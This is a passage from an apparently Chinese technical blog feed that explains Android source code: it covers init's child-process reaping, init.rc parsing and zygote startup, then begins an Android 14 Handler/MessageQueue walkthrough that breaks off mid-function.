class="string">&quot;signal_fd: received unexpected signal &quot;</span> &lt;&lt; siginfo.ssi_signo;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ReapAnyOutstandingChildren</strong><br><strong>system/core/init/sigchld_handler.cpp</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ReapAnyOutstandingChildren</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (ReapOneProcess() != <span class="number">0</span>) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终会调用到ReapOneProcess()方法<br><strong>ReapOneProcess</strong><br>说明：ReapOneProcess是最终的处理函数，这个函数先调用waitpid找出挂掉进程的pid，然后根据pid找到对应Service，最后调用Service的Reap方法清除资源，根据进程对应的类型，决定是否重启机器或重启进程<br><strong>system/core/init/sigchld_handler.cpp</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">pid_t</span> <span class="title function_">ReapOneProcess</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">siginfo_t</span> siginfo = &#123;&#125;;</span><br><span class="line">    <span class="comment">//用waitpid函数获取状态发生变化的子进程pid</span></span><br><span class="line">    <span class="comment">//waitpid的标记为WNOHANG，即非阻塞，返回为正值就说明有进程挂掉了</span></span><br><span class="line">    <span class="keyword">if</span> (TEMP_FAILURE_RETRY(waitid(P_ALL, <span class="number">0</span>, &amp;siginfo, WEXITED | WNOHANG | WNOWAIT)) != <span class="number">0</span>) &#123;</span><br><span class="line">        PLOG(ERROR) &lt;&lt; <span class="string">&quot;waitid failed&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">auto</span> pid = siginfo.si_pid;</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//当我们知道当前有一个僵尸pid，我们使用scopeguard来清除该pid</span></span><br><span class="line">    <span class="keyword">auto</span> reaper = make_scope_guard([pid] &#123; TEMP_FAILURE_RETRY(waitpid(pid, nullptr, WNOHANG)); &#125;);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> wait_string;</span><br><span class="line">    Service* service = nullptr;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (SubcontextChildReap(pid)) &#123;</span><br><span class="line">        name = <span class="string">&quot;Subcontext&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//通过该pid找到对应的service</span></span><br><span class="line">        service = ServiceList::GetInstance().FindService(pid, &amp;Service::pid);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (service) &#123;</span><br><span class="line">            name = StringPrintf(<span class="string">&quot;Service &#x27;%s&#x27; (pid %d)&quot;</span>, service-&gt;name().c_str(), pid);</span><br><span class="line">            <span class="keyword">if</span> (service-&gt;flags() &amp; SVC_EXEC) &#123;</span><br><span class="line">                <span class="keyword">auto</span> exec_duration = boot_clock::now() - service-&gt;time_started();</span><br><span class="line">                <span class="keyword">auto</span> exec_duration_ms =</span><br><span class="line">                <span class="built_in">std</span>::chrono::duration_cast&lt;<span class="built_in">std</span>::chrono::milliseconds&gt;(exec_duration).count();</span><br><span class="line">                wait_string = StringPrintf(<span class="string">&quot; waiting took %f seconds&quot;</span>, exec_duration_ms / <span class="number">1000.0f</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (service-&gt;flags() &amp; SVC_ONESHOT) &#123;</span><br><span class="line">                <span class="keyword">auto</span> exec_duration = boot_clock::now() - service-&gt;time_started();</span><br><span class="line">                <span class="keyword">auto</span> exec_duration_ms =</span><br><span class="line">                <span class="built_in">std</span>::chrono::duration_cast&lt;<span class="built_in">std</span>::chrono::milliseconds&gt;(exec_duration)</span><br><span class="line">                .count();</span><br><span class="line">                wait_string = StringPrintf(<span class="string">&quot; oneshot service took %f seconds in background&quot;</span>,</span><br><span class="line">                    exec_duration_ms / <span class="number">1000.0f</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            name = StringPrintf(<span class="string">&quot;Untracked pid %d&quot;</span>, pid);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (siginfo.si_code == CLD_EXITED) &#123;</span><br><span class="line">        LOG(INFO) &lt;&lt; name &lt;&lt; <span class="string">&quot; exited with status &quot;</span> &lt;&lt; siginfo.si_status &lt;&lt; wait_string;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        LOG(INFO) &lt;&lt; name &lt;&lt; <span class="string">&quot; received signal &quot;</span> &lt;&lt; siginfo.si_status &lt;&lt; wait_string;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//没有找到service，说明已经结束了，退出</span></span><br><span class="line">    <span class="keyword">if</span> (!service) <span class="keyword">return</span> pid;</span><br><span class="line">    <span class="comment">//清除子进程相关的资源</span></span><br><span class="line">    service-&gt;Reap(siginfo);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (service-&gt;flags() &amp; SVC_TEMPORARY) &#123;</span><br><span class="line">        ServiceList::GetInstance().RemoveService(*service);<span class="comment">//移除该service</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> pid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解析init-rc"><a href="#解析init-rc" class="headerlink" title="解析init.rc"></a>解析init.rc</h3><p>当属性服务建立完成后，init的自身功能基本就告一段落，接下来需要来启动其他的进程。但是init进程如何其他其他进程呢？其他进程都是一个二进制文件，我们可以直接通过exec的命令方式来启动，例如 ./system/bin/init second_stage，来启动init进程的第二阶段。但是Android系统有那么多的Native进程，如果都通过传exec在代码中一个个的来执行进程，那无疑是一个灾难性的设计。<br>init.rc是一个配置文件，内部由Android初始化语言编写（Android Init Language）编写的脚本。类似通过读取配置文件的方式，来启动不同的进程。</p><p><strong>LoadBootScripts</strong></p><p>说明：如果没有特殊配置ro.boot.init_rc，则解析./init.rc<br>把/system/etc/init、/system_ext/etc/init、/odm/etc/init、/product/etc/init这几个路径加入init.rc之后解析的路径，在init.rc解析完成后，解析这些目录里面rc文件<br>注意：init.rc位于/system/core/rootdir下<br><strong>system/core/init/init.cpp</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">LoadBootScripts</span><span class="params">(ActionManager&amp; action_manager, ServiceList&amp; service_list)</span> &#123;</span><br><span class="line">    Parser parser = CreateParser(action_manager, service_list);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> bootscript = GetProperty(<span class="string">&quot;ro.boot.init_rc&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (bootscript.empty()) &#123;</span><br><span class="line">        parser.ParseConfig(<span class="string">&quot;/system/etc/init/hw/init.rc&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!parser.ParseConfig(<span class="string">&quot;/system/etc/init&quot;</span>)) &#123;</span><br><span class="line">            late_import_paths.emplace_back(<span class="string">&quot;/system/etc/init&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// late_import is available only in Q and earlier release. As we don&#x27;t</span></span><br><span class="line">        <span class="comment">// have system_ext in those versions, skip late_import for system_ext.</span></span><br><span class="line">        parser.ParseConfig(<span class="string">&quot;/system_ext/etc/init&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!parser.ParseConfig(<span class="string">&quot;/vendor/etc/init&quot;</span>)) &#123;</span><br><span class="line">            late_import_paths.emplace_back(<span class="string">&quot;/vendor/etc/init&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!parser.ParseConfig(<span class="string">&quot;/odm/etc/init&quot;</span>)) &#123;</span><br><span class="line">            late_import_paths.emplace_back(<span class="string">&quot;/odm/etc/init&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!parser.ParseConfig(<span class="string">&quot;/product/etc/init&quot;</span>)) &#123;</span><br><span class="line">            late_import_paths.emplace_back(<span class="string">&quot;/product/etc/init&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        parser.ParseConfig(bootscript);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Android7.0后，init.rc进行了拆分，每个服务都有自己的rc文件，他们基本上都被加载到/system/etc/init，/vendor/etc/init, /odm/etc/init等目录，等init.rc解析完成后，会来解析这些目录中的rc文件，用来执行相关的动作。</p><p><strong>CreateParser</strong><br>说明：创建Parser解析对象，例如service、on、import对象</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Parser <span class="title function_">CreateParser</span><span class="params">(ActionManager&amp; action_manager, ServiceList&amp; service_list)</span> &#123;</span><br><span class="line">    Parser parser;</span><br><span class="line"> </span><br><span class="line">    parser.AddSectionParser(<span class="string">&quot;service&quot;</span>, <span class="built_in">std</span>::make_unique&lt;ServiceParser&gt;(</span><br><span class="line">                            &amp;service_list, GetSubcontext(), <span class="built_in">std</span>::nullopt));</span><br><span class="line">    parser.AddSectionParser(<span class="string">&quot;on&quot;</span>, <span class="built_in">std</span>::make_unique&lt;ActionParser&gt;(&amp;action_manager, GetSubcontext()));</span><br><span class="line">    parser.AddSectionParser(<span class="string">&quot;import&quot;</span>, <span class="built_in">std</span>::make_unique&lt;ImportParser&gt;(&amp;parser));</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> parser;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行Action动作<br>按顺序把相关Action加入触发器队列，按顺序为 early-init -&gt; init -&gt; late-init. 然后在循环中，执行所有触发器队列中Action带Command的执行函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">am.QueueEventTrigger(<span class="string">&quot;early-init&quot;</span>);</span><br><span class="line">am.QueueEventTrigger(<span class="string">&quot;init&quot;</span>);</span><br><span class="line">am.QueueEventTrigger(<span class="string">&quot;late-init&quot;</span>);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(waiting_for_prop || Service::is_exec_service_running())) &#123;</span><br><span class="line">            am.ExecuteOneCommand();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Zygote启动"><a href="#Zygote启动" class="headerlink" title="Zygote启动"></a>Zygote启动</h3><p>从Android 5.0的版本开始，Android支持64位的编译，因此zygote本身也支持32位和64位。通过属性ro.zygote来控制不同版本的zygote进程启动。<br>在init.rc的import段我们看到如下代码：<br><strong>system/core/rootdir/init.rc</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import /system/etc/init/hw/init.$&#123;ro.zygote&#125;.rc <span class="comment">// 可以看出init.rc不再直接引入一个固定的文件，而是根据属性ro.zygote的内容来引入不同的文件</span></span><br></pre></td></tr></table></figure><p>init.rc位于/system/core/rootdir下。在这个路径下还包括四个关于zygote的rc文件。<br>分别是init.zygote32.rc，init.zygote32_64.rc，init.zygote64.rc，init.zygote64_32.rc，由硬件决定调用哪个文件。<br>这里拿64位处理器为例，init.zygote64.rc的代码如下所示：<br><strong>system/core/rootdir/init.zygote64.rc</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">service zygote /system/bin/app_process64 -Xzygote /system/bin --zygote --start-system-server</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">main</span></span></span><br><span class="line"><span class="class">    <span class="title">priority</span> -20</span></span><br><span class="line"><span class="class">    <span class="title">user</span> <span class="title">root</span></span></span><br><span class="line"><span class="class">    <span class="title">group</span> <span class="title">root</span> <span class="title">readproc</span> <span class="title">reserved_disk</span></span></span><br><span class="line"><span class="class">    <span class="title">socket</span> <span class="title">zygote</span> <span class="title">stream</span> 660 <span class="title">root</span> <span class="title">system</span></span></span><br><span class="line"><span class="class">    <span class="title">socket</span> <span class="title">usap_pool_primary</span> <span class="title">stream</span> 660 <span class="title">root</span> <span class="title">system</span></span></span><br><span class="line"><span class="class">    <span class="title">onrestart</span> <span class="title">exec_background</span> - <span class="title">system</span> <span class="title">system</span> -- /<span class="title">system</span>/<span class="title">bin</span>/<span class="title">vdc</span> <span class="title">volume</span> <span class="title">abort_fuse</span></span></span><br><span class="line"><span class="class">    <span class="title">onrestart</span> <span class="title">write</span> /<span class="title">sys</span>/<span class="title">power</span>/<span class="title">state</span> <span class="title">on</span></span></span><br><span class="line"><span class="class">    <span class="title">onrestart</span> <span class="title">restart</span> <span class="title">audioserver</span></span></span><br><span class="line"><span class="class">    <span class="title">onrestart</span> <span class="title">restart</span> <span class="title">cameraserver</span></span></span><br><span class="line"><span class="class">    <span class="title">onrestart</span> <span class="title">restart</span> <span class="title">media</span></span></span><br><span class="line"><span class="class">    <span class="title">onrestart</span> <span class="title">restart</span> <span class="title">netd</span></span></span><br><span class="line"><span class="class">    <span class="title">onrestart</span> <span class="title">restart</span> <span class="title">wificond</span></span></span><br><span class="line"><span class="class">    <span class="title">writepid</span> /<span class="title">dev</span>/<span class="title">cpuset</span>/<span class="title">foreground</span>/<span class="title">tasks</span></span></span><br><span class="line"><span class="class">    <span class="title">critical</span> <span class="title">window</span>=</span>$&#123;zygote.critical_window.minute:-off&#125; target=zygote-fatal</span><br></pre></td></tr></table></figure><p>service zygote /system/bin/app_process64 -Xzygote /system/bin –zygote –start-system-server 解析：<br>service zygote ：init.zygote64.rc 中定义了一个zygote服务。 init进程就是通过这个service名称来创建zygote进程<br>/system/bin/app_process64 -Xzygote /system/bin –zygote –start-system-server解析：<br>zygote这个服务，通过执行进行/system/bin/app_process64 并传入4个参数进行运行：</p><table><thead><tr><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>参数1</td><td>-Xzygote 该参数将作为虚拟机启动时所需的参数</td></tr><tr><td>参数2</td><td>/system/bin 代表虚拟机程序所在目录</td></tr><tr><td>参数3</td><td>–zygote 指明以ZygoteInit.java类中的main函数作为虚拟机执行入口</td></tr><tr><td>参数4</td><td>–start-system-server 告诉Zygote进程启动systemServer进程</td></tr></tbody></table><h3 id="init总结"><a href="#init总结" class="headerlink" title="init总结"></a>init总结</h3><p>init进程主要分为两个阶段，<br>第一个阶段主要完成了：</p><ul><li>创建文件系统目录，并挂载了相关文件系统</li><li>初始化了日志输出系统</li><li>加载了SELinux（访问控制安全模块）安全策略</li><li>进入第二阶段</li></ul><p>第二阶段主要完成了</p><ul><li>初始化了属性系统</li><li>执行了SELinux第二阶段，并恢复了一些文件的安全上下文</li><li>新建了epoll，并初始化了子进程终止信号处理函数</li><li>设置了系统其他属性，并开启了属性系统</li><li>解析init.rc来启动其他进程</li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 14 Handler 源码解析</title>
      <link href="/2024/02/24/2024-02-24/"/>
      <url>/2024/02/24/2024-02-24/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Handler 是一套 Android 消息传递机制。在多线程应用场景中，将子线程中需要更新 UI 的操作消息，传递到 UI 主线程，从而实现子线程通知 UI 更新最终实现异步消息处理。说白了是用于线程之间的通信。Handler主要有4个重要类：<strong>Handler、Message、MessageQueue、Looper。</strong></p><h3 id="Handler-简介"><a href="#Handler-简介" class="headerlink" title="Handler 简介"></a>Handler 简介</h3><p>Handler主要有4个重要类：Handler、Message、MessageQueue、Looper。</p><ul><li><strong>Handler：</strong>负责消息的发送和处理，子线程中使用 sendMessage() 发送消息；在handleMessage()中处理。</li><li><strong>Message：</strong>消息载体，里面存储这线程消息。</li><li><strong>MessageQueue：</strong>消息队列，遵循先进先出的原则，存储着 sendMessage() 发送来的子线程消息。</li><li><strong>Looper：</strong>消息循环器，负责从 MessageQueue 中循环取消息，再将取出的消息分发给 handleMessage()，来处理消息。</li></ul><p><img src="/images/20240224/20240224001.png"></p><h3 id="Handler-源码"><a href="#Handler-源码" class="headerlink" title="Handler 源码"></a>Handler 源码</h3><p>了解 Handler，首先我们要了解 Handler 从消息发送到消息处理这整个流程，下面将分析这一流程，并回答下面几个问题：</p><ol><li>一个线程有几个Handler?</li><li>一个线程有几个Looper？如何保证？</li><li>Handler 内存泄漏原因？为什么其他的内部分没有过这个问题？</li><li>为何主线程可以 new Handler？如果想要在子线程中 new Handler 要做些什么准备？</li><li>子线程中的维护的 looper，消息队列无消息的时候处理方案是什么？有什么用？</li><li>既然可以存在多个 Handler 往 MessageQueue 中添加数据（发消息时，各个handler 可能处于不同的线程），那么它内部是如何确保线程安全的？</li><li>我们使用 Message 时应如何创建它？</li><li>使用 Handler 的 postDelay 后，消息队列会有什么变化？</li><li>Looper 死循环为什么不会导致应用卡死(ANR)?</li></ol><h4 id="Handler"><a href="#Handler" class="headerlink" title="Handler"></a>Handler</h4><p>Handler 负责消息的发送和处理，该类中通过 sendXXX、postXXX等方法发送消息，共有14个这样的方法。而在 handleMessage() 中处理收到的消息。这里以 <strong>sendMessage(Message msg)</strong> 方法为例进行源码分析。<br><strong>frameworks/base/core/java/android/os/Handler.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Handler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">sendMessage</span><span class="params">(<span class="meta">@NonNull</span> Message msg)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> sendMessageDelayed(msg, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">sendMessageDelayed</span><span class="params">(<span class="meta">@NonNull</span> Message msg, <span class="type">long</span> delayMillis)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (delayMillis &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            delayMillis = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 第二的参数代表执行的时间，为：系统当前时间+延迟的时间</span></span><br><span class="line">        <span class="keyword">return</span> sendMessageAtTime(msg, SystemClock.uptimeMillis() + delayMillis);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">sendMessageAtTime</span><span class="params">(<span class="meta">@NonNull</span> Message msg, <span class="type">long</span> uptimeMillis)</span> &#123;</span><br><span class="line">        <span class="type">MessageQueue</span> <span class="variable">queue</span> <span class="operator">=</span> mQueue;</span><br><span class="line">        <span class="keyword">if</span> (queue == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">RuntimeException</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(</span><br><span class="line">                    <span class="built_in">this</span> + <span class="string">&quot; sendMessageAtTime() called with no mQueue&quot;</span>);</span><br><span class="line">            Log.w(<span class="string">&quot;Looper&quot;</span>, e.getMessage(), e);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> enqueueMessage(queue, msg, uptimeMillis);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 不管使用什么方法发送消息，都会调到 Handler#enqueueMessage()</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">enqueueMessage</span><span class="params">(<span class="meta">@NonNull</span> MessageQueue queue, <span class="meta">@NonNull</span> Message msg,</span></span><br><span class="line"><span class="params">            <span class="type">long</span> uptimeMillis)</span> &#123;</span><br><span class="line">        <span class="comment">// 把当前对象赋给msg.target，这样 Message 就持有了 Handler</span></span><br><span class="line">        msg.target = <span class="built_in">this</span>;</span><br><span class="line">        msg.workSourceUid = ThreadLocalWorkSource.getUid();</span><br><span class="line">        <span class="keyword">if</span> (mAsynchronous) &#123;</span><br><span class="line">            msg.setAsynchronous(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 调用 MessageQueue#enqueueMessage() 往消息队列添加消息。</span></span><br><span class="line">        <span class="keyword">return</span> queue.enqueueMessage(msg, uptimeMillis);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="MessageQueue"><a href="#MessageQueue" class="headerlink" title="MessageQueue"></a>MessageQueue</h4><p>enqueueMessage 里面其实是一个优先级队列，将收到消息根据执行的时间 when 进行做排序处理。<br><strong>frameworks/base/core/java/android/os/MessageQueue.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">MessageQueue</span> &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">enqueueMessage</span><span class="params">(Message msg, <span class="type">long</span> when)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (msg.target == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Message must have a target.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (msg.isInUse()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(msg + <span class="string">&quot; This message is already in use.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (mQuitting) &#123;</span><br><span class="line">                <span class="type">IllegalStateException</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(</span><br><span class="line">                        msg.target + <span class="string">&quot; sending message to a Handler on a dead thread&quot;</span>);</span><br><span class="line">                Log.w(TAG, e.getMessage(), e);</span><br><span class="line">                msg.recycle();</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            msg.markInUse();</span><br><span class="line">            msg.when = when;</span><br><span class="line">            <span class="type">Message</span> <span class="variable">p</span> <span class="operator">=</span> mMessages;</span><br><span class="line">            <span class="type">boolean</span> needWake;</span><br><span class="line">            <span class="comment">// 如果是0，则放在最前面</span></span><br><span class="line">            <span class="keyword">if</span> (p == <span class="literal">null</span> || when == <span class="number">0</span> || when &lt; p.when) &#123;</span><br><span class="line">                <span class="comment">// New head, wake up the event queue if blocked.</span></span><br><span class="line">                msg.next = p;</span><br><span class="line">                mMessages = msg;</span><br><span class="line">                needWake = mBlocked;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// Inserted within the middle of the queue.  Usually we don&#x27;t have to wake</span></span><br><span class="line">                <span class="comment">// up the event queue unless there is a barrier at the head of the queue</span></span><br><span class="line">                <span class="comment">// and the message is the earliest asynchronous message in the queue.</span></span><br><span class="line">                needWake = mBlocked &amp;&amp; p.target == <span class="literal">null</span> &amp;&amp; msg.isAsynchronous();</span><br><span class="line">                Message prev;</span><br><span class="line">                <span class="comment">// 对单链表轮询，根据 when 进行排序插入消息。</span></span><br><span class="line">                <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">                    prev = p;</span><br><span class="line">                    p = p.next;</span><br><span class="line">                    <span class="keyword">if</span> (p == <span class="literal">null</span> || when &lt; p.when) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (needWake &amp;&amp; p.isAsynchronous()) &#123;</span><br><span class="line">                        needWake = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                msg.next = p; <span class="comment">// invariant: p == prev.next</span></span><br><span class="line">                prev.next = msg;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// We can assume mPtr != 0 because mQuitting is 